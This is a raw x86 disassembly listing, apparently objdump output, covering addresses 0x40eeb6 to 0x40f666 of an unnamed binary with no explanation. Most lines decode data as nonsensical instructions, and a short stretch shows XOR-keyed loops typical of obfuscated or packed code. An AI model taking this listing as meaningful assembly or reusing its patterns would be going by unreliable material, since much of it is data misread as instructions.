  40eeb6:	mov    edx,0xf47c72ca
  40eebb:	pop    ecx
  40eebc:	arpl   WORD PTR [ecx],dx
  40eebe:	pop    ecx
  40eebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eec0:	and    al,0xcd
  40eec2:	adc    eax,DWORD PTR [edx+0x34]
  40eec5:	and    BYTE PTR [ebx-0x27],ah
  40eec8:	loop   0x40eeb0
  40eeca:	inc    ecx
  40eecb:	inc    esp
  40eecc:	aas    
  40eecd:	adc    DWORD PTR ds:0x85021020,eax
  40eed3:	retf   
  40eed4:	ret    
  40eed5:	fst    DWORD PTR [edx+0x77273a5f]
  40eedb:	or     al,0xaa
  40eedd:	mov    dl,0x10
  40eedf:	jae    0x40ef07
  40eee1:	jp     0x40ef4a
  40eee3:	sub    eax,0xe31f6f7f
  40eee8:	sub    ecx,DWORD PTR [ecx-0x2b]
  40eeeb:	jne    0x40ef09
  40eeed:	cmp    dl,bl
  40eeef:	push   ds
  40eef0:	iret   
  40eef1:	call   0x9265:0xad269226
  40eef8:	sahf   
  40eef9:	shl    esi,0xaa
  40eefc:	xchg   BYTE PTR [edi],bh
  40eefe:	in     eax,dx
  40eeff:	mov    dl,0xd9
  40ef01:	xchg   edi,eax
  40ef02:	(bad)
  40ef06:	mov    cl,0x34
  40ef08:	addr16 mov dh,cl
  40ef0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef0c:	push   ebp
  40ef0d:	mov    al,ds:0xa095a00e
  40ef12:	or     ebp,DWORD PTR [eax+0x53beba55]
  40ef18:	sbb    ah,BYTE PTR [eax-0xd971aa5]
  40ef1e:	jo     0x40ef7a
  40ef20:	test   BYTE PTR [eax+0x2928c3a5],dh
  40ef26:	xchg   ecx,eax
  40ef27:	std    
  40ef28:	sub    DWORD PTR [eax-0x1eaf2690],ecx
  40ef2e:	lds    edi,FWORD PTR [edx]
  40ef30:	pop    edi
  40ef31:	jg     0x40ef6f
  40ef33:	nop
  40ef34:	fmul   DWORD PTR [ecx]
  40ef36:	rol    ch,1
  40ef38:	mov    ecx,0x98a7311d
  40ef3d:	addr16 jbe 0x40eec4
  40ef40:	push   esp
  40ef41:	push   0xffffffc0
  40ef43:	(bad)  
  40ef44:	popa   
  40ef45:	inc    ebx
  40ef46:	sub    ebx,DWORD PTR ds:0x7d807d16
  40ef4c:	push   ds
  40ef4d:	adc    BYTE PTR [ebp+ecx*2-0x30],0x1c
  40ef52:	jns    0x40ef1c
  40ef54:	cmp    al,0xc0
  40ef56:	rcr    DWORD PTR [ebp+0x50],0x30
  40ef5a:	cwde   
  40ef5b:	dec    eax
  40ef5c:	add    al,0x89
  40ef5e:	dec    esi
  40ef5f:	pop    ebp
  40ef60:	ret    0xfa5b
  40ef63:	(bad)  [ebx+0x10775358]
  40ef69:	push   ebx
  40ef6a:	or     edx,esi
  40ef6c:	test   al,0xbf
  40ef6e:	push   edx
  40ef6f:	xor    ch,BYTE PTR [ebx-0x2fc74019]
  40ef75:	rol    DWORD PTR ds:0x98f9c94,cl
  40ef7b:	leave  
  40ef7c:	xchg   ecx,eax
  40ef7d:	pop    esi
  40ef7e:	bound  edx,QWORD PTR [eax-0x1e3a37ce]
  40ef84:	mov    gs,esp
  40ef86:	dec    ebx
  40ef87:	in     al,dx
  40ef88:	out    dx,eax
  40ef89:	mov    bl,0xa2
  40ef8b:	cmp    esi,esp
  40ef8d:	mov    ch,0xf4
  40ef8f:	dec    edx
  40ef90:	cmp    DWORD PTR [esi*1+0x663ee18e],esi
  40ef97:	or     DWORD PTR [edx],ecx
  40ef99:	je     0x40eff5
  40ef9b:	and    eax,0xdd3a79ba
  40efa0:	mov    WORD PTR [ebx],gs
  40efa2:	mov    bh,0x47
  40efa4:	rcr    BYTE PTR [ebx+0xed5b9e4],cl
  40efaa:	cwde   
  40efab:	mov    esi,0x93996916
  40efb0:	or     DWORD PTR [ecx-0x5787bc3],ecx
  40efb6:	fwait
  40efb7:	dec    ecx
  40efb8:	push   cs
  40efb9:	lods   eax,DWORD PTR ds:[esi]
  40efba:	push   ss
  40efbb:	and    eax,0x19
  40efbe:	add    eax,0x1f2d5993
  40efc3:	or     BYTE PTR ds:0x13867a93,dh
  40efc9:	and    BYTE PTR [eax],ah
  40efcb:	jbe    0x40efda
  40efcd:	fucomp st(1)
  40efcf:	and    al,0xdc
  40efd1:	(bad)  
  40efd3:	jp     0x40efe6
  40efd5:	fdivrp st(1),st
  40efd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efd8:	push   ds
  40efd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efda:	fild   QWORD PTR [eax-0x318b501d]
  40efe0:	scas   eax,DWORD PTR es:[edi]
  40efe1:	adc    al,0xa
  40efe3:	sub    bh,BYTE PTR [ecx+esi*2-0x1c]
  40efe7:	mov    ah,0xf5
  40efe9:	fwait
  40efea:	mov    ebp,0x59c395b
  40eff0:	rcr    BYTE PTR [eax+eiz*1+0x2ac59095],1
  40eff7:	cmp    edi,esi
  40eff9:	push   eax
  40effa:	in     al,dx
  40effb:	add    al,0x93
  40effd:	stos   DWORD PTR es:[edi],eax
  40effe:	inc    esp
  40efff:	cmp    eax,0xed4e5596
  40f004:	ficomp WORD PTR [ecx]
  40f006:	jle    0x40f077
  40f008:	out    dx,eax
  40f009:	mov    dh,0xba
  40f00b:	push   ecx
  40f00c:	sar    DWORD PTR [esi-0x26abdf0b],0x6c
  40f013:	out    0x8d,al
  40f015:	or     al,0x83
  40f017:	or     BYTE PTR [ebx+eax*4],dl
  40f01a:	ret    
  40f01b:	sahf   
  40f01c:	push   0xffffffc0
  40f01e:	fs (bad) 
  40f022:	or     BYTE PTR [ebx],bl
  40f024:	jg     0x40f034
  40f026:	xor    ch,BYTE PTR [eax-0x46]
  40f029:	mov    ebp,ss
  40f02b:	inc    ebp
  40f02c:	mov    dl,0x8b
  40f02e:	xor    ecx,DWORD PTR [ecx+ecx*2-0x5]
  40f032:	cmp    eax,0x3971f6
  40f037:	(bad)  
  40f038:	sbb    dl,BYTE PTR [ebx+0x10]
  40f03b:	out    dx,al
  40f03c:	sub    BYTE PTR [ebx],bl
  40f03e:	iret   
  40f03f:	in     eax,0x53
  40f041:	add    eax,0x691c6a60
  40f046:	out    dx,al
  40f047:	pop    esi
  40f048:	lods   eax,DWORD PTR ds:[esi]
  40f049:	not    DWORD PTR [esi+0x7b]
  40f04c:	fsubr  st(4),st
  40f04e:	arpl   WORD PTR [edi-0x251be61c],ax
  40f054:	test   eax,0xf76d95b6
  40f059:	sub    edi,DWORD PTR [ecx]
  40f05b:	lods   eax,DWORD PTR ds:[esi]
  40f05d:	(bad)  
  40f05e:	fwait
  40f05f:	pop    edi
  40f060:	imul   esp,eax,0x9146cbc
  40f066:	loop   0x40f092
  40f068:	adc    edi,DWORD PTR [eax]
  40f06a:	dec    ebp
  40f06b:	cmp    eax,0x7a34488e
  40f070:	dec    ebx
  40f071:	sub    DWORD PTR [eax],edi
  40f073:	lahf   
  40f074:	xor    al,0xf9
  40f076:	mov    ds:0x110699ec,al
  40f07b:	int3   
  40f07c:	mov    ch,0x96
  40f07e:	daa    
  40f07f:	mov    al,0x6
  40f081:	int    0x50
  40f083:	aaa    
  40f084:	jne    0x40f0c4
  40f086:	or     dl,al
  40f088:	adc    BYTE PTR [ecx],cl
  40f08a:	call   0xf75266da
  40f08f:	rcr    eax,cl
  40f091:	ror    cl,0x51
  40f094:	mov    dl,0xbd
  40f096:	aam    0xd7
  40f098:	cmp    eax,0x42e23519
  40f09d:	xor    eax,0xa715ea37
  40f0a2:	sbb    DWORD PTR ds:0x3c16df56,eax
  40f0a8:	ret    
  40f0a9:	push   0x33
  40f0ab:	sbb    al,al
  40f0ad:	jmp    0x6eababee
  40f0b2:	push   ss
  40f0b3:	je     0x40f0af
  40f0b5:	push   ds
  40f0b6:	fild   WORD PTR [edx+0x31672586]
  40f0bc:	or     DWORD PTR [ecx-0x472089d0],ebx
  40f0c2:	sub    esi,DWORD PTR [esi+edi*4-0x1410e3fb]
  40f0c9:	int    0xc7
  40f0cb:	push   0x7f
  40f0cd:	add    eax,DWORD PTR [edx-0xde6452f]
  40f0d3:	mov    ebx,0xe5b90262
  40f0d8:	dec    ebx
  40f0d9:	outs   dx,BYTE PTR ds:[esi]
  40f0da:	push   cs
  40f0db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0dc:	cs je  0x40f122
  40f0df:	cmp    dh,BYTE PTR [ecx+0x575e8955]
  40f0e5:	aas    
  40f0e6:	pop    ds
  40f0e7:	vmaxsd xmm4,xmm0,QWORD PTR [esi+eiz*8]
  40f0ec:	lea    edx,[ebp+0x6285cbb4]
  40f0f2:	mov    ch,0x60
  40f0f4:	jmp    0x2615:0x45104099
  40f0fb:	lods   al,BYTE PTR ds:[esi]
  40f0fc:	shr    ecx,cl
  40f0fe:	mov    DWORD PTR [ecx-0x7a1a36e3],esi
  40f104:	mov    dl,0xc2
  40f106:	add    ch,BYTE PTR [ebp+0x2007a082]
  40f10c:	ror    DWORD PTR [ebp+0x9288a8f],0x26
  40f113:	push   0x24
  40f115:	sub    al,0x3c
  40f117:	hlt    
  40f118:	pop    ds
  40f119:	or     al,0x26
  40f11b:	mov    ds:0x89c88158,eax
  40f120:	(bad)  
  40f121:	add    esi,DWORD PTR [esi-0x53]
  40f124:	nop
  40f125:	ja     0x40f18f
  40f127:	arpl   di,cx
  40f129:	(bad)  
  40f12a:	loop   0x40f10f
  40f12c:	jle    0x40f0ea
  40f12e:	call   FWORD PTR [edx+0x46]
  40f131:	lea    ebp,[edx-0xec5268]
  40f137:	mov    esi,DWORD PTR [edi-0x6d]
  40f13a:	call   0xce4cffec
  40f13f:	retf   
  40f140:	cdq    
  40f141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f142:	out    0xd8,eax
  40f144:	push   esi
  40f145:	mov    ch,0x6f
  40f147:	mov    ecx,0xd11839f0
  40f14c:	jle    0x40f131
  40f14e:	outs   dx,BYTE PTR ds:[esi]
  40f14f:	sbb    esi,DWORD PTR [edi+0x5d193064]
  40f155:	adc    al,0xfd
  40f157:	xor    edx,DWORD PTR [eax+ebx*1]
  40f15a:	nop
  40f15b:	iret   
  40f15c:	push   ecx
  40f15d:	adc    DWORD PTR ds:0x68daf2b5,esi
  40f163:	imul   ebx,DWORD PTR [eax],0x725e31a8
  40f169:	aaa    
  40f16a:	push   edx
  40f16b:	xor    ebp,eax
  40f16d:	xchg   DWORD PTR [edi],esp
  40f16f:	xor    eax,0xecd25de8
  40f174:	push   edi
  40f175:	(bad)  
  40f176:	in     eax,dx
  40f177:	xor    al,0xb2
  40f179:	mov    al,0xf3
  40f17b:	and    al,0x23
  40f17d:	adc    BYTE PTR [ebx+0x79],0x54
  40f181:	ss pushf 
  40f183:	xor    BYTE PTR ss:[edi+0x53],dh
  40f187:	mov    ecx,DWORD PTR [edi+0x6]
  40f18a:	and    BYTE PTR [edi],0x4e
  40f18d:	gs stc 
  40f18f:	dec    ecx
  40f190:	jmp    DWORD PTR [edx-0x26b02c86]
  40f196:	test   ah,bh
  40f198:	(bad)  [edi-0x5aa7118]
  40f19e:	ret    0xe770
  40f1a1:	cli    
  40f1a2:	pop    esp
  40f1a3:	pop    ss
  40f1a4:	mov    cl,0x5f
  40f1a6:	xchg   DWORD PTR [edx-0x37ff6693],esi
  40f1ac:	jge    0x40f134
  40f1ae:	sbb    BYTE PTR [ecx+0x7cb2dddf],al
  40f1b4:	sub    eax,0x673976e
  40f1b9:	aam    0x81
  40f1bb:	sub    al,0xdf
  40f1be:	mov    dl,0xae
  40f1c0:	cmp    BYTE PTR [ebx+0x375ce96b],ch
  40f1c6:	ins    BYTE PTR es:[edi],dx
  40f1c7:	or     DWORD PTR [ebp+0x23cfb590],0xffffffa9
  40f1ce:	psrlq  mm3,QWORD PTR ds:0x22bebeb3
  40f1d5:	push   0x32
  40f1d7:	and    al,0x21
  40f1d9:	add    BYTE PTR [ebp-0x3c316061],ch
  40f1df:	ficomp DWORD PTR [eax-0x6e5b0603]
  40f1e5:	ror    DWORD PTR [ebx-0x57f162dd],cl
  40f1eb:	out    dx,al
  40f1ec:	pop    ss
  40f1ed:	fisubr WORD PTR [esi]
  40f1ef:	sbb    dh,dl
  40f1f1:	sar    DWORD PTR [eax+0x41],1
  40f1f4:	mov    cs,ebp
  40f1f6:	mov    al,ds:0x2c9d817d
  40f1fb:	adc    dh,BYTE PTR [eax]
  40f1fd:	cmp    al,BYTE PTR [eax]
  40f1ff:	cld    
  40f200:	xchg   edi,eax
  40f201:	pusha  
  40f202:	inc    ecx
  40f203:	jne    0x40f1b7
  40f205:	hlt    
  40f206:	test   DWORD PTR [ebp-0x22],edx
  40f209:	and    al,0x26
  40f20b:	call   0x4e37f10
  40f210:	jae    0x40f205
  40f212:	sub    BYTE PTR [esi-0x27c401a5],dl
  40f218:	daa    
  40f219:	cli    
  40f21a:	outs   dx,BYTE PTR ds:[esi]
  40f21b:	or     esp,eax
  40f21d:	inc    esi
  40f21e:	(bad)  
  40f21f:	sbb    BYTE PTR [ecx-0x25d562d4],bl
  40f225:	popa   
  40f226:	clc    
  40f227:	loope  0x40f1f6
  40f229:	mov    al,ds:0x8e415e9b
  40f22e:	xchg   edi,eax
  40f22f:	push   edi
  40f230:	pop    ss
  40f231:	jb     0x40f1c0
  40f233:	mov    esi,edi
  40f235:	pop    edx
  40f236:	push   cs
  40f237:	xchg   ebp,eax
  40f238:	mov    cl,0x65
  40f23a:	mov    dh,0x9d
  40f23c:	int    0x90
  40f23e:	pop    ebp
  40f23f:	(bad)  
  40f240:	and    cl,BYTE PTR [ebx-0x15fd692a]
  40f246:	ret    0x95e
  40f249:	loopne 0x40f28c
  40f24b:	jbe    0x40f1ff
  40f24d:	(bad)  
  40f24e:	fild   QWORD PTR [ebp+0x6c3f59fd]
  40f254:	(bad)  
  40f256:	cli    
  40f257:	mov    al,0x54
  40f259:	add    eax,ecx
  40f25b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f25c:	jmp    0xe368:0x20f358df
  40f263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f264:	mov    al,BYTE PTR [edx]
  40f266:	cmp    eax,0xb51c10fc
  40f26b:	fs es hlt 
  40f26e:	aam    0xa7
  40f270:	ins    DWORD PTR es:[edi],dx
  40f271:	cmp    dl,BYTE PTR [ebp-0x3624646d]
  40f277:	xchg   esi,eax
  40f278:	mov    al,ds:0xaa2ee58f
  40f27d:	cld    
  40f27e:	into   
  40f27f:	cmp    ah,BYTE PTR [edi-0x76]
  40f282:	xor    dh,BYTE PTR [ebp+0x4f71d7cb]
  40f288:	pop    edi
  40f289:	idiv   BYTE PTR [ebp-0x5]
  40f28c:	jb     0x40f261
  40f28e:	rcl    BYTE PTR [esi+0x21],cl
  40f291:	ror    DWORD PTR [eax+0x74],1
  40f294:	push   cs
  40f295:	push   edx
  40f296:	dec    eax
  40f297:	pop    ebp
  40f298:	xlat   BYTE PTR ds:[ebx]
  40f299:	jl     0x40f260
  40f29b:	aad    0x7c
  40f29d:	adc    al,0xb2
  40f29f:	fistp  QWORD PTR [esi+0xc]
  40f2a2:	xor    eax,0x19a35bc5
  40f2a7:	xchg   esp,eax
  40f2a8:	ss adc eax,0x30e6e88a
  40f2ae:	mov    al,ds:0x6870fcb8
  40f2b3:	sahf   
  40f2b4:	pop    ecx
  40f2b5:	jl     0x40f307
  40f2b7:	push   esi
  40f2b8:	sahf   
  40f2b9:	xor    eax,0xdda210ab
  40f2be:	lods   al,BYTE PTR ds:[esi]
  40f2bf:	call   0x496d88ac
  40f2c4:	hlt    
  40f2c5:	dec    ebx
  40f2c6:	mov    al,0xd3
  40f2c8:	shl    DWORD PTR [edi-0x55184cae],1
  40f2ce:	push   ds
  40f2cf:	stos   BYTE PTR es:[edi],al
  40f2d0:	fcom   DWORD PTR [edx+0x3ca4bffc]
  40f2d6:	xor    al,0x39
  40f2d8:	repz pop edi
  40f2da:	loopne 0x40f2d9
  40f2dc:	not    cl
  40f2de:	dec    esp
  40f2df:	mov    eax,fs
  40f2e1:	push   esp
  40f2e2:	adc    al,0xde
  40f2e4:	mov    edi,0xb8a7e310
  40f2e9:	fwait
  40f2ea:	sub    BYTE PTR [ebp-0x7091a69],0x5e
  40f2f1:	push   ss
  40f2f2:	push   ecx
  40f2f3:	add    al,BYTE PTR [esi]
  40f2f5:	not    DWORD PTR [ebx]
  40f2f7:	mov    eax,0x9d596cb5
  40f2fc:	inc    ebp
  40f2fd:	jbe    0x40f353
  40f2ff:	dec    edx
  40f300:	inc    edi
  40f301:	push   esp
  40f302:	fsub   DWORD PTR [edx-0x37]
  40f305:	add    bh,bh
  40f307:	inc    esp
  40f308:	out    0x6f,al
  40f30a:	cmp    BYTE PTR [eax+0x12],ah
  40f30d:	xchg   edi,eax
  40f30e:	inc    edx
  40f30f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f310:	sub    al,0xcd
  40f312:	dec    ebp
  40f313:	lahf   
  40f314:	retf   
  40f315:	push   esi
  40f316:	sbb    BYTE PTR [edi],0xa4
  40f319:	add    eax,0x900191d6
  40f31e:	jmp    0x40f2dc
  40f320:	sar    DWORD PTR [esi-0x30],1
  40f323:	out    dx,al
  40f324:	or     al,0x7d
  40f326:	cdq    
  40f327:	js     0x40f343
  40f329:	mov    esi,0xf974c405
  40f32e:	jl     0x40f306
  40f330:	ins    DWORD PTR es:[edi],dx
  40f331:	mov    DWORD PTR [eax+0x45277dac],ecx
  40f337:	pop    ds
  40f338:	or     al,0xf6
  40f33a:	imul   esi,DWORD PTR [ecx-0x2c],0x2ddc3410
  40f341:	push   edx
  40f342:	pop    ebx
  40f343:	ds sub ecx,eax
  40f346:	gs dec ecx
  40f348:	jmp    0x2df9:0x430f1747
  40f34f:	aaa    
  40f350:	ins    BYTE PTR es:[edi],dx
  40f351:	ret    0xf718
  40f354:	ja     0x40f331
  40f356:	mov    bl,0x2f
  40f358:	test   DWORD PTR [edi-0x7d],ebx
  40f35b:	mov    ecx,0x836f2cb4
  40f360:	adc    DWORD PTR [edx-0x57372783],0xf371c223
  40f36a:	sub    dl,BYTE PTR [edi+0x65c1feb7]
  40f370:	or     esp,eax
  40f372:	(bad)  [edi+0x20ad538c]
  40f378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f379:	cmp    BYTE PTR [ecx-0x46],0x4f
  40f37d:	pop    edx
  40f37e:	adc    al,BYTE PTR ds:0xfb331a8b
  40f384:	mov    DWORD PTR [edx],edi
  40f386:	mov    edx,DWORD PTR [ebp+0x8]
  40f389:	xor    edx,eax
  40f38b:	inc    ecx
  40f38c:	inc    DWORD PTR [ebp-0x18]
  40f38f:	add    edx,esi
  40f391:	cmp    ecx,edx
  40f393:	jb     0x40cfd4
  40f399:	jmp    0x40f3e3
  40f39e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3a1:	mov    DWORD PTR [ebp+0x8],ecx
  40f3a4:	jmp    0x40f3d6
  40f3a9:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3ac:	mov    edx,DWORD PTR [ebp-0x8]
  40f3af:	xor    ecx,eax
  40f3b1:	xor    edx,eax
  40f3b3:	sub    ecx,edx
  40f3b5:	sub    ecx,esi
  40f3b7:	xor    ecx,eax
  40f3b9:	mov    DWORD PTR [ebp+0x8],ecx
  40f3bc:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3bf:	mov    edx,DWORD PTR [ebp+0x8]
  40f3c2:	imul   edx,edx,0x5708f1
  40f3c8:	xor    ecx,eax
  40f3ca:	add    ecx,esi
  40f3cc:	lea    ecx,[ebp+ecx*4-0x64]
  40f3d0:	mov    edi,DWORD PTR [ecx]
  40f3d2:	add    edx,edi
  40f3d4:	mov    DWORD PTR [ecx],edx
  40f3d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3d9:	xor    ecx,eax
  40f3db:	add    ecx,esi
  40f3dd:	jne    0x40f3a9
  40f3e3:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3e6:	mov    DWORD PTR [ebp+0x8],ecx
  40f3e9:	jmp    0x40f41b
  40f3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3f1:	mov    edx,DWORD PTR [ebp-0x8]
  40f3f4:	xor    ecx,eax
  40f3f6:	xor    edx,eax
  40f3f8:	sub    ecx,edx
  40f3fa:	sub    ecx,esi
  40f3fc:	xor    ecx,eax
  40f3fe:	mov    DWORD PTR [ebp+0x8],ecx
  40f401:	mov    ecx,DWORD PTR [ebp+0x8]
  40f404:	mov    edx,DWORD PTR [ebp+0x8]
  40f407:	imul   edx,edx,0x5708f1
  40f40d:	xor    ecx,eax
  40f40f:	add    ecx,esi
  40f411:	lea    ecx,[ebp+ecx*4-0x64]
  40f415:	mov    edi,DWORD PTR [ecx]
  40f417:	add    edx,edi
  40f419:	mov    DWORD PTR [ecx],edx
  40f41b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f41e:	xor    ecx,eax
  40f420:	add    ecx,esi
  40f422:	jne    0x40f3ee
  40f428:	mov    ecx,DWORD PTR [ebp-0x8]
  40f42b:	mov    edx,DWORD PTR [ebp-0x20]
  40f42e:	xor    ecx,eax
  40f430:	lea    ecx,[ecx+edx*1+0x3272dc]
  40f437:	mov    DWORD PTR [ebp-0x20],ecx
  40f43a:	inc    DWORD PTR [ebp+0xc]
  40f43d:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f440:	xor    ecx,eax
  40f442:	add    ecx,esi
  40f444:	jne    0x40ced6
  40f44a:	jmp    0x413be3
  40f44f:	mov    ecx,DWORD PTR [ebp-0xc]
  40f452:	mov    DWORD PTR [ebp+0x8],ecx
  40f455:	jmp    0x41180f
  40f45a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f45d:	mov    edx,DWORD PTR [ebp-0x8]
  40f460:	xor    ecx,eax
  40f462:	xor    edx,eax
  40f464:	sub    ecx,edx
  40f466:	jmp    0x4117ee
  40f46b:	mov    al,ds:0x7334f23d
  40f470:	cmp    ebp,DWORD PTR [edx+0x3e2d7a79]
  40f476:	mov    ds:0xed3fc4be,al
  40f47b:	pop    ebp
  40f47c:	int    0x7c
  40f47e:	jl     0x40f487
  40f480:	pop    edi
  40f481:	jl     0x40f4ff
  40f483:	inc    ebx
  40f484:	fucomip st,st(1)
  40f486:	push   ecx
  40f487:	or     BYTE PTR [edx+edx*4-0x92bb966],bl
  40f48e:	lds    bp,DWORD PTR [esi+0x71]
  40f492:	inc    eax
  40f493:	test   BYTE PTR [ecx],dh
  40f495:	mov    esi,0x782b0803
  40f49a:	in     eax,0x3c
  40f49c:	rol    bh,1
  40f49e:	ficom  DWORD PTR [ecx]
  40f4a0:	ret    0x42c4
  40f4a3:	xchg   BYTE PTR [edx-0x287c7ba6],dh
  40f4a9:	test   eax,0x88a64660
  40f4ae:	inc    esi
  40f4af:	mov    edi,0x1f963055
  40f4b4:	repz mov eax,ds:0x7abf65d6
  40f4ba:	pop    ebx
  40f4bb:	loop   0x40f4cd
  40f4bd:	adc    esp,ebp
  40f4bf:	in     eax,0x3a
  40f4c1:	sbb    eax,0x217ce077
  40f4c6:	push   ebp
  40f4c7:	fbld   TBYTE PTR ds:0xc85121e7
  40f4cd:	mov    ch,0x8b
  40f4cf:	int    0x9d
  40f4d1:	and    BYTE PTR [eax+0x0],ch
  40f4d4:	pop    ebp
  40f4d5:	call   0xa189:0x8dff801d
  40f4dc:	pop    ds
  40f4dd:	cmc    
  40f4de:	scas   eax,DWORD PTR es:[edi]
  40f4df:	rcr    edx,1
  40f4e1:	or     DWORD PTR [edx],ebp
  40f4e3:	sahf   
  40f4e4:	cmp    esp,esi
  40f4e6:	stos   BYTE PTR es:[edi],al
  40f4e7:	push   0xe810e7be
  40f4ec:	cmp    eax,0xe7d0e388
  40f4f1:	lds    ebx,FWORD PTR [edx+0x5e]
  40f4f4:	mov    edx,0x17d3e200
  40f4f9:	hlt    
  40f4fa:	mov    dh,0xa4
  40f4fc:	daa    
  40f4fd:	jne    0x40f4d7
  40f4ff:	dec    ebp
  40f500:	mov    WORD PTR [eax+0x46],?
  40f503:	pop    esp
  40f504:	imul   eax,DWORD PTR [edx],0x77
  40f507:	ins    DWORD PTR es:[edi],dx
  40f508:	out    0xc6,al
  40f50a:	(bad)  
  40f50b:	dec    eax
  40f50c:	or     al,0x25
  40f50e:	mov    edx,0x65131cb4
  40f513:	das    
  40f514:	adc    bh,bh
  40f516:	mul    DWORD PTR ss:0x95156716
  40f51d:	gs leave 
  40f51f:	push   cs
  40f520:	je     0x40f4b0
  40f522:	mov    ebx,0x9ec626c2
  40f527:	add    al,0x7
  40f529:	aas    
  40f52a:	(bad)  
  40f52b:	clc    
  40f52c:	and    edx,ecx
  40f52e:	sti    
  40f52f:	jmp    0xd209:0x26eebb3f
  40f536:	inc    edi
  40f537:	mov    ebp,0xb06bdef
  40f53c:	cmp    al,0x24
  40f53e:	sbb    DWORD PTR [ebx-0xc522ef1],ebp
  40f544:	fnsave [esi]
  40f546:	jmp    0x972b02a6
  40f54b:	jle    0x40f53b
  40f54d:	cmp    BYTE PTR [ebp-0x429f6ec3],dh
  40f553:	mov    bl,0x1
  40f555:	lds    edx,FWORD PTR [ebx+0x38e0f1a4]
  40f55b:	punpckhwd mm3,QWORD PTR [ebx-0x5e]
  40f55f:	push   0xffffff98
  40f561:	stos   BYTE PTR es:[edi],al
  40f562:	pop    esp
  40f563:	(bad)  
  40f565:	jmp    0x858ad90
  40f56a:	imul   edi,DWORD PTR [edx],0xffffffb0
  40f56d:	pop    ds
  40f56e:	clc    
  40f56f:	dec    esi
  40f570:	fidiv  DWORD PTR ds:[edx]
  40f573:	std    
  40f574:	hlt    
  40f575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f576:	add    al,0xd2
  40f578:	rcl    BYTE PTR [edx],0x63
  40f57b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f57c:	pop    esi
  40f57d:	fisttp QWORD PTR [ecx-0x6177ca57]
  40f583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f584:	call   0x4726:0xbad40140
  40f58b:	sbb    DWORD PTR [edx-0x2b6dea62],eax
  40f591:	xchg   ebp,eax
  40f592:	and    eax,0xa96f5406
  40f597:	or     esp,DWORD PTR [edi+0x47]
  40f59a:	js     0x40f553
  40f59c:	out    0xc2,eax
  40f59e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f59f:	push   ds
  40f5a0:	add    DWORD PTR [ebx+0x5c],ebx
  40f5a3:	mov    eax,ds:0x2b59a2a4
  40f5a8:	jge    0x40f585
  40f5aa:	mov    cl,0xce
  40f5ac:	push   DWORD PTR [eax]
  40f5ae:	inc    edi
  40f5af:	sbb    al,0x23
  40f5b1:	loopne 0x40f533
  40f5b3:	dec    ebp
  40f5b4:	xchg   edi,eax
  40f5b5:	jmp    0x40f5d9
  40f5b7:	imul   ebx,ebp,0x147b1679
  40f5bd:	test   BYTE PTR [edi],ch
  40f5bf:	jge    0x40f567
  40f5c1:	sub    eax,0xbad1fe66
  40f5c6:	sbb    eax,DWORD PTR [edx]
  40f5c8:	xchg   esi,eax
  40f5c9:	lds    ebp,FWORD PTR [ebp-0x25]
  40f5cc:	test   DWORD PTR [edx+0x64],esp
  40f5cf:	fsub   st(6),st
  40f5d1:	ja     0x40f5f0
  40f5d3:	or     bl,bh
  40f5d5:	gs sar edi,1
  40f5d8:	jp     0x40f5d6
  40f5da:	and    DWORD PTR [edx+0x7e],0x72cc4948
  40f5e1:	daa    
  40f5e2:	xchg   esi,eax
  40f5e3:	mov    ds:0xfead5a34,al
  40f5e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e9:	leave  
  40f5ea:	or     eax,0xaaf039f0
  40f5ef:	jg     0x40f586
  40f5f1:	adc    DWORD PTR [ebx-0xa265a2b],ecx
  40f5f7:	add    ah,BYTE PTR [eax-0x32]
  40f5fa:	cld    
  40f5fb:	and    DWORD PTR [ebx],0x52
  40f5fe:	sub    ebp,ecx
  40f600:	dec    ecx
  40f601:	xchg   ecx,eax
  40f602:	sbb    eax,0x34a5ffb2
  40f607:	mov    cl,0x6d
  40f609:	std    
  40f60a:	sub    eax,0x7f71914b
  40f60f:	ja     0x40f673
  40f611:	sbb    eax,0x3235d9a5
  40f616:	xchg   ebp,eax
  40f617:	cmp    BYTE PTR [ebp-0x73],dh
  40f61a:	pop    ss
  40f61b:	xor    esi,DWORD PTR [esi+ecx*4+0x22]
  40f61f:	inc    ecx
  40f620:	mov    esi,0x7bc340c4
  40f625:	into   
  40f626:	cs xor al,0x1e
  40f629:	adc    esp,DWORD PTR [edx-0x4a3f4b3]
  40f62f:	jo     0x40f647
  40f631:	rcr    DWORD PTR [edi+0x5b],cl
  40f634:	retf   0xa2a9
  40f637:	(bad)  
  40f638:	push   edi
  40f639:	imul   ebp,ebp,0xffffff9d
  40f63c:	test   DWORD PTR [eax+0x0],ecx
  40f63f:	mov    ch,0xcc
  40f641:	push   es
  40f642:	sbb    DWORD PTR [ecx-0x563d1f2f],0x55
  40f649:	lahf   
  40f64a:	mov    ch,0xe1
  40f64c:	callw  0x2a84
  40f650:	jae    0x40f63f
  40f652:	xor    BYTE PTR [esp+ebx*2+0x4e],cl
  40f656:	stos   BYTE PTR es:[edi],al
  40f657:	loope  0x40f668
  40f659:	cmp    bl,ch
  40f65b:	inc    edi
  40f65c:	dec    ecx
  40f65d:	enter  0xf962,0x26
  40f661:	mov    ebx,0xe3ea986e
  40f666:	out    0x82,eax
